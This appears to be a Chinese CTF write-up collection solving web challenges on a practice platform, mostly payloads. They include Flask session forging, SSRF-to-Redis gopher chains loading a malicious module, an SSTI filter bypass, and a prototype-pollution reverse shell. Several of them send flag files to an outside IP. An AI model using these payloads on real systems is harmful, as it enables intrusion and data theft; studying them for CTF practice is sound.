## 0x01[HarekazeCTF2019]Easy Notes

这个题目给了源码，用户又没有后端校验，所以我们很容易想到考session的反序列化，因为(sctf考烂了)。具体分析流程可以看网上的·wp，总结就是，需要伪造以下两点:

1. 文件名
2. 序列化的数据

## 0x02 [SWPU2019]Web3

访问任意路由发现的token:`keyqqqwwweee!@#$%^&*`,发现是伪造session。下面就是随便操作了。

```
.eJyrVspMUbKqVlJIUrJS8g1xLFeq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PL0IojHIPy42MCCtOcbS1BWkoLU4tykvMTcWhoBYAbr4gMA.YdBAWg.vnOXIyBk7oZzGTjDV5lS5GVwXeo
```

解码之后，我们知道这才是我们需要的

```
{'id': b'1', 'is_login': True, 'password': 'admin', 'username': 'admin'}
```

运行命令

```
python .\flask_session_cookie_manager3.py encode -s 'keyqqqwwweee!@#$%^&*' -t "{'id': b'1', 'is_login': True, 'password': 'admin', 'username': 'admin'}"
```

![image-20220101195442108](https://img.dem0dem0.top/images/image-20220101195442108.png)

不知道为什么会这样，题目估计配置多少有点问题了。

## 0x03 [网鼎杯 2020 玄武组]SSRFMe

读取hint.php

```
http://a2f4f36b-1930-46a5-b853-1b9830b9b342.node4.buuoj.cn:81/?url=http://0.0.0.0/hint.php
```

```
string(1342) " <?php
if($_SERVER['REMOTE_ADDR']==="127.0.0.1"){
  highlight_file(__FILE__);
}
if(isset($_POST['file'])){
  file_put_contents($_POST['file'],"<?php echo 'redispass is root';exit();".$_POST['file']);
}
"
```

知道了这是ssrf打redis。盲猜是打主从复制了。

`$match_result=preg_match('/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/',$url);`这个提醒太明显了，差评

开始打。运行一个假的redis，然后

```
gopher://0.0.0.0:6379/_auth%2520root%250aconfig%2520set%2520dir%2520%252ftmp%252f%250aquit
```

下载

```
gopher://0.0.0.0:6379/_auth root
config set dbfilename exp.so
slaveof 8.142.93.103 7777
quit
```

记得二次url编码

```
gopher://0.0.0.0:6379/_auth%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%32%25%36%36%25%36%39%25%36%63%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%32%30%25%36%35%25%37%38%25%37%30%25%32%65%25%37%33%25%36%66%25%30%61%25%37%33%25%36%63%25%36%31%25%37%36%25%36%35%25%36%66%25%36%36%25%32%30%25%33%38%25%32%65%25%33%31%25%33%34%25%33%32%25%32%65%25%33%39%25%33%33%25%32%65%25%33%31%25%33%30%25%33%33%25%32%30%25%33%37%25%33%37%25%33%37%25%33%37%25%30%61%25%37%31%25%37%35%25%36%39%25%37%34
```

执行命令

```
gopher://0.0.0.0:6379/_auth root
module load /tmp/exp.so
system.rev 8.142.93.103 2333
quit
```

题目环境好像出网但是又没有完全出 我不多说了，内网的redis链接不上的主机。 我本地测试payload没问题。

```
gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dir%2520/tmp/%250d%250aquit
gopher://0.0.0.0:6379/_auth%2520root%250Aconfig%2520set%2520dbfilename%2520exp.so%250Aslaveof%25208.142.93.103%25207777%250Aquit
gopher://0.0.0.0:6379/_auth%2520root%250Amodule%2520load%2520%252Ftmp%252Fexp.so%250Asystem.rev%25208.142.93.103%25206666%250Aquit
```



## 0x04 

```
curl -i -X PUT 'http://node4.buuoj.cn:27746/hurdles/!?get=flag&%26%3D%26%3D%26=%2500%0a' -u 'player:54ef36ec71201fdf9d1423fd26f97f6b' -A '1337 Browser v.9000' -H 'X-Forwarded-For:13.37.13.37,127.0.0.1' -b 'Fortune=6265' -H 'Accept:text/plain' -H 'Accept-Language:ru;' -H 'origin:https://ctf.bsidessf.net' -H 'Referer:https://ctf.bsidessf.net/challenges'
```

记得一点`-u`

## 0x05 [PASECA2019]honey_shop

(lzctf原题哈哈哈哈

```
eXuJzykDsiHS2PZlDHYn3ASpyXxWazYiTZqEwqbP
python3 flask_session_cookie_manager3.py encode -s "eXuJzykDsiHS2PZlDHYn3ASpyXxWazYiTZqEwqbP" -t "{'balance': 1338, 'purchases': []}"
```

## 0x06 [GWCTF 2019]你的名字

报

可以复写绕过的题目不多了。。

```
{% iconfigf ''.__claconfigss__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.func_glconfigobals.lineconfigcache.oconfigs.popconfigen('curl http://8.142.93.103/ -d ` cat /flag_1s_Hera|base64`;') %}1{% endiconfigf %}
```

## 0x07 [CSAWQual 2016]i_got_id

perl 被喷得好惨呀 呜呜

参考连接: https://tsublogs.wordpress.com/2016/09/18/606/

![image-20220101233621565](https://img.dem0dem0.top/images/image-20220101233621565.png)

其实这个题目还是有点东西。首先需要猜测一波语句，然后还要会perl

https://blog.csdn.net/shangguanzhe/article/details/40432679

可以知道这个符号`<>`会对`ARGV`产生反应，获取运行的参数。并且会对参数进行`open`操作，后面的故事就不用多说了，就是open命令执行了。

## 0x08 [RCTF 2019]Nextphp

这道题目我看到`FFI`大概猜了一波是它，但是还是不敢确定。之前每次用ffi绕过都是payload直接一把嗦，今天发现了`preload.php`才知道FFI还要配合preload.php才能成功的运行。

那我们先看看preload.php的作用https://wiki.php.net/rfc/preload

查了一下，发现文档中说了这么一句![image-20220101235133651](https://img.dem0dem0.top/images/image-20220101235133651.png)

他的意思是FFI只能在文件中运行，其他文件都不行，所以我们用它来调用不就可以了吗？。

```php
<?php
final class A implements Serializable {
    protected $data = [
        'ret' => null,
        'func' => 'FFI::cdef',
        'arg' => "int php_exec(int type, char *cmd);"
    ];

    public function serialize (): string {
        return serialize($this->data);
    }

    public function unserialize($payload) {
        $this->data = unserialize($payload);
        $this->run();
    }

    public function __construct () {
    }
}

$a = new A;
echo serialize($a);
```

```
$a=unserialize('C%3a1%3a"A"%3a97%3a{a%3a3%3a{s%3a3%3a"ret"%3bN%3bs%3a4%3a"func"%3bs%3a9%3a"FFI%3a%3acdef"%3bs%3a3%3a"arg"%3bs%3a34%3a"int+php_exec(int+type,+char+*cmd)%3b"%3b}}');var_dump($a->ret->php_exec(2,'curl%208.142.93.103/`cat%20/flag`'));
```

`所以以后在拿到配置文件要好好读，每一个文件都是有用的!!!`

生成cookie必须使用一下这个文件

```python
from flask.sessions import SecureCookieSessionInterface

secret_key = "cded826a1e89925035cc05f0907855f7"

class FakeApp:
    secret_key = secret_key


fake_app = FakeApp()
session_interface = SecureCookieSessionInterface()
serializer = session_interface.get_signing_serializer(fake_app)
cookie = serializer.dumps(
    {"history": [{"code": '__import__("os").popen("cat flag.txt").read()'}]}
)
print(cookie)
```

我发现网上的脚本对于python3.6+版本支持不行，最好大家还是使用python3.6或者3.5

## 0x09 [网鼎杯 2020 青龙组]notes

这个题目 其实我最开始猜测考点有两个地方

![image-20220102002011574](https://img.dem0dem0.top/images/image-20220102002011574.png)

看着有点像是模板渲染。但是这里的命令执行太明显了

![image-20220102002039928](https://img.dem0dem0.top/images/image-20220102002039928.png)

有一个遍历，配套的就只要成功的原型链污染，我一搜那个我没见过的模板，全网都是他的原型链。

```
POST /edit_note HTTP/1.1
Host: ba12a62e-bb4b-479d-8296-6e466d138ef7.node4.buuoj.cn:81
Content-Length: 71
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://ba12a62e-bb4b-479d-8296-6e466d138ef7.node4.buuoj.cn:81
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://ba12a62e-bb4b-479d-8296-6e466d138ef7.node4.buuoj.cn:81/edit_note
Accept-Encoding: gzip, deflate
Accept-Language: zh,zh-TW;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6
Cookie: UM_distinctid=.eJyrVspMUbKqVlJIUrJS8g20tVWq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFiyxgX.Xp7n9g.Wrfpp0DVY6_pH_mpD3_l6nNTpWU
Connection: close

id=__proto__&author=bash+-i+>%26+/dev/tcp/ip/80+0>%261&raw=jj
```

`/status`触发。

## 0x0A [FBCTF2019]Event

`event_name=a&event_address=a&event_important=__class__.__init__.__globals__[app].config`

可以拿到key，然后用上面脚本伪造即可。

## 0x0B [WMCTF2020]Make PHP Great Again 2.0

赵总的0day不多解释。https://blog.csdn.net/weixin_39916479/article/details/111289716 (后面有机会一定复现)

## 0x0C [HITCON 2016]Leaking

这个题目最后我看到wp完全没有我刚看到这个题目那么震惊，我没想到是直接去读取内存，Buffer(500).然后爆破就可以了。

还以为是逃逸然后遍历全局对象。
